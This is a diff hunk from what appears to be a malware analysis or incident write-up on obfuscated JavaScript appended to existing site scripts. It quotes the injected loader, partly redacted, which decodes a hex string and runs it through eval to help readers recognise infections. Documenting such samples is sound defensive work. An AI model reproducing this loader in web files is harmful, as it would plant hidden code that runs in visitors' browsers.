@@ -7,7 +7,10 @@ The javascript appended to existing javascript files was obfuscated. It looked s
 
 
 ```
-/*25a520a617147585c97ef01f04c898e3*/;(function(){var azesryri="";var nhhdsnkf="76e6f2c63297b6966286397b7661220423206670441465[... redacted ...]65306f73697466736f653e3c2f6469763e223b6f6356d56e42626f4792e6707056e64368696c4287232647293b7d7";for (var tndandrr=0;tndandrr<nhhdsnkf.length;tndandrr+=2){azesryri=azesryri+parseInt(nhhdsnkf.substring(tndandrr,tndandrr+2), 16)+",";}azesryri=azesryri.substring(0,azesryri.length-1);eval(eval('String.fromCharCode('+azesryri+')'));})();/*25a520a617147585c97ef01f04c898e3*/
+/*25a520a617147585c97ef01f04c898e3*/;(function(){var azesryri="";var nhhdsnkf="76e6f2c63297b69662
+86397b7661220423206670441465[... redacted...]65306f73697466736f653e3c2f6469763e223b6f6356d56e4262
+6f4792e6707056e64368696c4287232647293b7d7";for (var tndandrr=0;tndandrr<nhhdsnkf.length;tndandrr+=2) {azesryri=azesryri+parseInt(nhhdsnkf.substring(tndandrr,tndandrr+2),16)+",";}azesryri=azesryri.subst
+ring(0,azesryri.length-1);eval(eval('String.fromCharCode('+azesryri+')'));})();/*25a520a617147585c97ef01f04c898e3*/
 ```
 
 To identify if the malicious javascript is similar, look for this template:
